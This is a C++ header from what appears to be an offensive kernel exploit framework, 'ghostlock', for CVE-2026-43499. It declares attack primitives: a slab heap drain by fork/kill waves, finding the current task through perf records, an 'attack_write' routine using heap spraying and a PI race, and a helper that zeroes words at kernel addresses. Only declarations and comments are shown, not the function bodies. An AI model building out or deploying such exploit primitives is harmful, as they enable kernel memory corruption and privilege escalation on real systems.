#ifndef GHOSTLOCK_BACKEND_CVE_2026_43499_PRIMITIVES_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43499_PRIMITIVES_HPP

#include "memory/payload_builder.h"
#include "support/status.hpp"

#include <cstdint>

namespace ghostlock::session {
    struct CoreSession;
} // namespace ghostlock::session

namespace ghostlock::backend {
    /* Pre-attack heap drain (fork/kill/reap waves). */
    void slab_drain(void);

    /* Find the current task through perf sample records. */
    uintptr_t perf_find_task(void);

    /* Non-template base for the cve_2026_43499 step sets: the write/zero
     * primitives every StepSet shares. Keeping them in a non-template class and
     * out of line gives each route one symbol and one body regardless of which
     * StepSet instantiates it, so the cmp_disasm "do_one_write" gate compares the
     * same function across StepSet changes (T4 design). */
    struct Cve43499Primitives {
        /* One route write: middleware resident fast path, else heap spray + PI
         * race. 'M' is the route policy (Select/Tcp/Multicast). */
        template <class M>
        [[nodiscard]] static Status attack_write(session::CoreSession &session,
                                                 const memory::WriteRequest &request,
                                                 const char *desc);

        /* Ancillary-context adapter: zero one word at an already-translated
         * kernel address through this middleware's write. Behaviors receive it
         * as a plain function pointer so they never name the middleware. */
        template <class M>
        [[nodiscard]] static Status zero_word(uintptr_t target, const char *desc);
    };
} // namespace ghostlock::backend

#endif
